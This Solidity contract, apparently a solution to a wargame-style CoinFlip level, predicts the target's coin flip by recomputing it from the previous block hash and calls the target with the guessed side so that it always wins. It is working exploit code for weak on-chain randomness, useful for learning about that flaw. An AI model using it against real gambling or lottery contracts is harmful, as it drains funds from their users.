// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; 

import "interfaces/ICoinFlip.sol";

contract CoinflipExploit {

ICoinFlip public coinflipContract;
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(ICoinFlip coinflip_) public{
    coinflipContract = coinflip_;
}

receive() external payable {

}

function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
   
    lastHash = blockValue;

    uint256 coinFlip = uint256(blockValue/FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinflipContract.flip(side);
  }
}